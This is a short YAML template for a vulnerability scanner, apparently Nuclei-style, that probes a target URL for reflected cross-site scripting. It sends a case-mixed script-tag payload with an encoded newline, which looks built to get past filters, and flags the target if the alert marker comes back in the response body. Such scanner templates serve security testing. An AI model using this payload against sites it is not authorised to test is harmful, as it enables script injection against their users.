id: xss5-1930
name: 'Raw XSS5 in text'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in text'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      text:
        - '<ScRiPt%0a>alert(nx51929)</ScRiPt>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx51929'
